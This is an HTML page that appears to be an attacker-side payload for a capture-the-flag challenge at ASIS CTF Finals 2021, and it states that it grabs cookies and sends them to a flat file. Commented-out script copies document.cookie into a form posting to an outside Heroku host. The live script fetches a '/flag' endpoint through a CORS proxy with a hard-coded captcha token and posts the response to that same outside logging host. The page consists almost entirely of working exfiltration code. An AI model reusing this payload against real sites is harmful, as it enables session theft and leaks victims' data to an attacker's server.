<html>
    <h1>Cookie Monster</h1>
    <h4>Joshua Famous</h4>
    <p>This website grabs cookies and sends them to a flat file. For ASIS CTF Finals 2021.</p>
    <form action="http://cookie-monster-jfam.herokuapp.com/cookie" method="POST" id="cookieForm">
        <input type="text" name="cookie" placeholder="xyz" id="cookieInput">
    </form>
    <form action="http://cookie-monster-jfam.herokuapp.com/log" method="POST" id="logForm">
        <input type="text" name="log" placeholder="xyz" id="logInput">
    </form>

    <script>
        //document.getElementById("cookieInput").value = document.cookie;
        //document.getElementById("cookieForm").submit();

        const url = 'http://65.21.255.24:5000/flag';
        //const url = 'http://cookie-monster-jfam.herokuapp.com/checkbody';
        params = {"g-recaptcha-response":"03AGdBq261ht3M5qK2OfbdcI0VReAF-TJrlLXbS19Ey3gt914UlgDEf1pCk2DJUfFKxOIW5bt5poSzmPG-Yt5rKs1UO0LWmZ-BYhauPsY-RlJmEmfMsXKku1H4R1n96nkE2Ii_MmsQy3azux8H7YfCVTmNE4ocUgtFGUG7InG4hRoT0MyTMx41eIE-fxdyIqqpeoJ0Q2sFTET1-GYUZ9UmWNDg9DaxpdesuPFRkmbOps0lRy5BeDH20zMBbUBbhGJxSjNHKF6jjsNEaOwUUyOljD7W26UXNFE72bmmhdaQot2_hQS7LcHahp_gf0EGkEKaexvJ2OaAqAo2xGgGxHkbTkBTXDIWxMaHSIBOT3R1I2CWu93xJDFw5gZVkccUa1uSKa2GULzxHBcMCfZVlrfKvnw67XGzwqiLr147YLzupV4LA1BZW4uu_I3d2T0Bp5ijh28dO1zEAQ5t"};
        
        function writeToLog(x){
            document.getElementById("logInput").value = x;
            document.getElementById("logForm").submit();
        }

        async function getFlag(){
            try {
                let res = await fetch('http://jf-cors-anywhere.herokuapp.com/' + url, {
                    method: 'POST',
                    body: JSON.stringify(params),
                    headers: {
                    'Content-Type': 'application/json'
                    //'Content-Type': 'application/x-www-form-urlencoded'
                    }
                });
                data = await res.text();
                console.log("Got data " + JSON.stringify(data));
                setTimeout(writeToLog("Got data " + JSON.stringify(data)),5000);

            } catch (e) {
                console.log('Failed with : ' + e);
                setTimeout(writeToLog('Failed with : ' + e),5000);
            }
        }

        getFlag();

    </script>
</html>